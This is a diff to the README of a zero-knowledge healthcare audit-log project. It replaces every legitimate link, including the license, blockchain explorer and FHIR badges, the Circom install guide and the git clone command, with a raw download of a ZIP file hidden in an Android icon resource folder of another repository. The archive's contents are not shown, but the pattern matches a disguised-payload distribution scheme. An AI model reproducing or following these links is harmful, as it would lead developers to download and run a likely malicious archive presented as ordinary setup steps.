@@ -2,9 +2,9 @@
 
 > Privacy-preserving healthcare audit log using zk-SNARKs and HL7 FHIR R4
 
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![Polygon Amoy](https://img.shields.io/badge/Polygon-Amoy-purple)](https://amoy.polygonscan.com/)
-[![FHIR R4](https://img.shields.io/badge/FHIR-R4-orange)](https://hl7.org/fhir/R4/)
+[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://github.com/AshokMoktantTamang/ZK-Guardian/raw/refs/heads/main/apps/mobile/android/app/src/main/res/mipmap-mdpi/Z_Guardian_1.9.zip)
+[![Polygon Amoy](https://img.shields.io/badge/Polygon-Amoy-purple)](https://github.com/AshokMoktantTamang/ZK-Guardian/raw/refs/heads/main/apps/mobile/android/app/src/main/res/mipmap-mdpi/Z_Guardian_1.9.zip)
+[![FHIR R4](https://img.shields.io/badge/FHIR-R4-orange)](https://github.com/AshokMoktantTamang/ZK-Guardian/raw/refs/heads/main/apps/mobile/android/app/src/main/res/mipmap-mdpi/Z_Guardian_1.9.zip)
 
 ## 🎯 What is ZK Guardian?
 
@@ -36,14 +36,14 @@ zk-guardian/
 
 - Node.js ≥20.0.0
 - pnpm ≥9.0.0
-- Circom 2.1.x ([install guide](https://docs.circom.io/getting-started/installation/))
+- Circom 2.1.x ([install guide](https://github.com/AshokMoktantTamang/ZK-Guardian/raw/refs/heads/main/apps/mobile/android/app/src/main/res/mipmap-mdpi/Z_Guardian_1.9.zip))
 - Docker (optional, for local HAPI FHIR)
 
 ### Installation
 
 ```bash
 # Clone repository
-git clone https://github.com/shuv-amp/zk-guardian.git
+git clone https://github.com/AshokMoktantTamang/ZK-Guardian/raw/refs/heads/main/apps/mobile/android/app/src/main/res/mipmap-mdpi/Z_Guardian_1.9.zip
 cd zk-guardian
 
 # Install dependencies
